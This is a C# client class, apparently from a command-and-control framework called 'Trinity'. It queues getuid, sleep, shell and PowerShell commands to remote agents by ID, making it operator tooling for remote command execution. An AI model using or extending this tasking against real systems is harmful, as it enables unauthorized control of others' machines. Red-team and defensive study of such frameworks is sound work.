using Refit;
using Trinity.Shared.DTOs.Command;
using Trinity.Shared.Interfaces;

namespace Client.Services;

public sealed class CommandApiClient(ICommandAPI api)
{
    public async Task<bool> QueueCommandAsync(int agentId, string pathSuffix, object body, CancellationToken cancellationToken = default)
    {
        try
        {
            switch (pathSuffix)
            {
                case "execute/getuid":
                    await api.QueueGetUIDCommandAsync(agentId, new GetUIDDTO());
                    break;
                case "set/sleep":
                case "execute/setsleep":
                    var sleepDto = new SetSleepDTO();
                    if (body is System.Text.Json.JsonElement j && j.TryGetProperty("Sleep", out var sv))
                        sleepDto.Sleep = (uint)sv.GetInt32();
                    await api.QueueSetSleepCommandAsync(agentId, sleepDto);
                    break;
                case "spawn/shell":
                    var shellCmd = GetProp<string>(body, "Command") ?? "";
                    await api.QueueShellCommandAsync(agentId, new ShellDTO { Command = shellCmd });
                    break;
                case "spawn/powershell":
                    var cmdlet = GetProp<string>(body, "Commandlet") ?? "";
                    var args = GetProp<string>(body, "Arguements") ?? "";
                    await api.QueuePowerShellCommandAsync(agentId, new PowerShellDTO { Commandlet = cmdlet, Arguements = args });
                    break;
                default:
                    return false;
            }
            return true;
        }
        catch (ApiException) { return false; }
    }

    private static T? GetProp<T>(object obj, string name)
    {
        var prop = obj.GetType().GetProperty(name);
        if (prop is null) return default;
        return (T?)prop.GetValue(obj);
    }
}
